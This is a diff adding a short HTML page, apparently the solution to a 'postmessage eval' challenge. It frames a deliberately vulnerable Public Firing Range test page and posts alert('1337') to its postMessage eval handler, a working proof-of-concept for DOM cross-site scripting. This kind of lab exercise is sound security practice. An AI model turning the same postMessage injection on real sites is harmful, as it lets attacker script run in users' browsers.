@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>postmessage eval challenge</title>
+</head>
+<body>
+		<iframe id="test" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" frameborder="0"></iframe>
+		<script>
+			const frame = document.querySelector("#test");
+			frame.onload = (e)=>{
+				frame.contentWindow.postMessage("alert('1337')", "*");
+			};
+		</script>
+</body>
+</html>
